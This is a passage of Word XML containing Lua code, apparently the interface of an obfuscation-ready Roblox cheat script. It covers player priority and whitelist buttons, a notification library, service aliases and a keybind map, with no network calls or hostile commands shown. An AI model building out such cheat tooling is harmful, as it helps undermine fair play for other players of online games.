        <w:t xml:space="preserve">            _section:button({name = "Prioritise", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not library.flags["player_list"] then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if table.find(library.whitelist, library.flags["player_list"]) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.remove(library.whitelist, table.find(library.whitelist, library.flags["player_list"]))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if table.find(library.priority, library.flags["player_list"]) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.remove(library.priority, table.find(library.priority, library.flags["player_list"]))</w:t>
      </w:r>
    </w:p>
    <w:p/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not table.find(library.priority, library.flags["player_list"]) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.insert(library.priority, library.flags["player_list"])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            _section:button({name = "Whitelist", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not library.flags["player_list"] then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if table.find(library.priority, library.flags["player_list"]) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.remove(library.priority, table.find(library.priority, library.flags["player_list"]))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if table.find(library.whitelist, library.flags["player_list"]) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.remove(library.whitelist, table.find(library.whitelist, library.flags["player_list"]))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not table.find(library.whitelist, library.flags["player_list"]) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.insert(library.whitelist, library.flags["player_list"])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local refreshplrs = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local cache = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for i,v in players:GetPlayers() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if v==lp then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.insert(cache, v.Name)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                table.sort(cache)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                plr_list.refresh_options(cache)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(refreshplrs)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            players.PlayerAdded:Connect(refreshplrs)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            players.PlayerRemoving:Connect(refreshplrs)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    --</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    -- Notification Library</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function notifications:refresh_notifs() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local offset = 50</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for i, v in notifications.notifs do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Position = vec2(20, offset)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(v, {Position = dim_offset(Position.X, Position.Y)}, Enum.EasingStyle.Quad, 0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                offset += (v.AbsoluteSize.Y + 10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return offset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function notifications:fade(path, is_fading)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local fading = is_fading and 1 or 0 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            library:tween(path, {BackgroundTransparency = fading}, Enum.EasingStyle.Quad, 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for _, instance in path:GetDescendants() do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not instance:IsA("GuiObject") then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if instance:IsA("UIStroke") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:tween(instance, {Transparency = fading}, Enum.EasingStyle.Quad, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if instance:IsA("TextLabel") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(instance, {TextTransparency = fading})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif instance:IsA("Frame") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(instance, {BackgroundTransparency = instance.Transparency and 0.6 and is_fading and 1 or 0.6}, Enum.EasingStyle.Quad, 1)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notifications:create_notification(options)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or "This is a title!";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                info = options.info or "This is extra info!";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                lifetime = options.lifetime or 3;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                outline;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items[ "notification" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = library[ "items" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 210, 0, 53);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";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BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AutomaticSize = Enum.AutomaticSize.Y;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(14, 14, 16)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"UIStroke" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Color = rgb(23, 23, 29);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "notification" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Transparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border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"title"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rgb(255, 255, 255);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"notification"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7, 0, 6);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"notification" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    CornerRadius = dim(0, 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"info"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rgb(145, 145, 145);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Text = cfg.info;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "notification" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, 9, 0, 22);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;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TextWrapped = true;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PaddingBottom = dim(0, 17);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingRight = dim(0, 8);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "info" ]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"bar" ] =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"notification" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, 8, 1, -6);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 0, 0, 5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = themes.preset.accent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"bar"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PaddingRight = dim(0, 8);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "notification" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });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local index = #notifications.notifs + 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            notifications.notifs[index] = items[ "notification" ]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            notifications:fade(items[ "notification" ], false)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local offset = notifications:refresh_notifs()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "notification" ].Position = dim_offset(20, offset)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            library:tween(items[ "notification" ], {AnchorPoint = vec2(0, 0)}, Enum.EasingStyle.Quad, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            library:tween(items[ "bar" ], {Size = dim2(1, -8, 0, 5)}, Enum.EasingStyle.Quad, cfg.lifetime)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait(cfg.lifetime)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                notifications.notifs[index] = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                notifications:fade(items[ "notification" ], true)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "notification" ], {AnchorPoint = vec2(1, 0)}, Enum.EasingStyle.Quad, 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "notification" ]:Destroy() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            --LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>-- Variables</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local scale = 0.5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local uis = Services.UserInputService</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local players = Services.Players</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local ws = Services.Workspace</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local rs = Services.ReplicatedStorage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local http_service = Services.HttpService</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local gui_service = Services.GuiService</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local lighting = Services.Lighting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local run = Services.RunService</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local stats = Services.Stats</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local coregui = Services.CoreGui</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local debris = Services.Debris</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local tween_service = Services.TweenService</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local sound_service = Services.SoundService</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local run_service = Services.RunService</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local vec2 = Vector2.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local vec3 = Vector3.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local dim2 = UDim2.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local dim = UDim.new </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local rect = Rect.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local cfr = CFrame.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local empty_cfr = cfr()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local point_object_space = empty_cfr.PointToObjectSpace</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local angle = CFrame.Angles</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local dim_offset = UDim2.fromOffset</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local color = Color3.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local rgb = Color3.fromRGB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local hex = Color3.fromHex</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local hsv = Color3.fromHSV</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local rgbseq = ColorSequence.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local rgbkey = ColorSequenceKeypoint.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local numseq = NumberSequence.new</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local numkey = NumberSequenceKeypoint.new</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local camera = ws.CurrentCamera</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local lp = players.LocalPlayer </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local mouse = lp:GetMouse() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local gui_offset = gui_service:GetGuiInset().Y</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local max = math.max </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local floor = math.floor </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local min = math.min </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local abs = math.abs </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local noise = math.noise</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local rad = math.rad </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local random = math.random </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local pow = math.pow </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local sin = math.sin </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local pi = math.pi </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local tan = math.tan </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local atan2 = math.atan2 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local clamp = math.clamp </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local insert = table.insert </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local find = table.find </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local remove = table.remove</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local concat = table.concat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">-- </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>-- Library ini</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local themes = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        preset = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            accent = rgb(255,255,255),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        }, </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        utility = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            accent = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BackgroundColor3 = {}, </w:t>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                TextColor3 = {}, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ImageColor3 = {}, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ScrollBarImageColor3 = {} </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            },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local keys = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.LeftShift] = "LS",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.RightShift] = "RS",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.LeftControl] = "LC",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.RightControl] = "RC",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Insert] = "INS",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Backspace] = "BS",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Return] = "Ent",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.LeftAlt] = "LA",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.RightAlt] = "RA",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.CapsLock] = "CAPS",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.One] = "1",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Two] = "2",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Three] = "3",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Four] = "4",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Five] = "5",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Six] = "6",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Seven] = "7",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Eight] = "8",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Nine] = "9",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Zero] = "0",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadOne] = "Num1",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadTwo] = "Num2",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadThree] = "Num3",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadFour] = "Num4",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadFive] = "Num5",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadSix] = "Num6",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadSeven] = "Num7",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadEight] = "Num8",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadNine] = "Num9",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.KeypadZero] = "Num0",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Minus] = "-",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Equals] = "=",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Tilde] = "~",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.LeftBracket] = "[",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.RightBracket] = "]",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.RightParenthesis] = ")",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.LeftParenthesis] = "(",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Semicolon] = ",",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Quote] = "'",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.BackSlash] = "\\",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Comma] = ",",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
